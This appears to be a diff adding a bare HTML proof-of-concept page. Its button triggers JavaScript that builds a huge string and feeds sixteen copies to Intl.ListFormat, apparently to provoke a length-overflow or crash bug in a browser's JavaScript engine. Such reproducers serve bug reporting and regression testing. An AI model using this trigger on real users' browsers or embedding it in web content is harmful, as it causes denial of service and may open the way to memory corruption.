@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<script type="text/javascript">
+	function ex(){
+		var s = "a".repeat(0xAFFFFFF);
+    console.log(new Intl.ListFormat().format(Array(16).fill(s)).length);
+	}
+	
+</script>
+<body>
+<button onclick="ex();">======</button>
+
+</body>
+</html>
